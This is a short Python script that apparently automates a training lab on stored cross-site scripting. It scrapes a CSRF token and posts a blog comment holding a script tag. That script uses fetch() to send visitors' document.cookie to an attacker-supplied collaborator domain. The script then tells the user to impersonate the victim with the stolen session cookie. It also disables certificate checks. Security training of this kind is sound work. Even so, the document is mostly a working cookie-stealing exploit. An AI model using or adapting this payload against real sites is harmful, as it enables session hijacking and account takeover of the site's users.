import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting cross-site scripting to steal cookies"

def run(url, payload=None, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        # Step 1: Fetch the blog post
        r = session.get(url.rstrip('/') + "/post?postId=1")
        csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)
        user_input = input("[?] Enter the Burp Collaborator domain: ").strip()
        string1 = user_input

        # Step 2: Post comment with XSS payload
        data = {
            "csrf": csrf_token,
            "postId": "1",
            "name": "mystic_mido",
            "email": "mystic_mido@mystic_mido.com",
            "comment": f"<script> fetch('https://{string1}/?cookies=' + document.cookie ) </script>"
        }

        response = session.post(url.rstrip('/') + "/post/comment", data=data)
        r = session.get(url.rstrip('/') + "/post?postId=1")
        print("Check you burp collaborator for the victim's session cookie, then use this cookie to impersonate the victim or submit it")
        return "Congratulations, you solved the lab!" in response.text or response.status_code == 200

    except Exception as e:
        print(f"[!] Error: {e}")
        return False
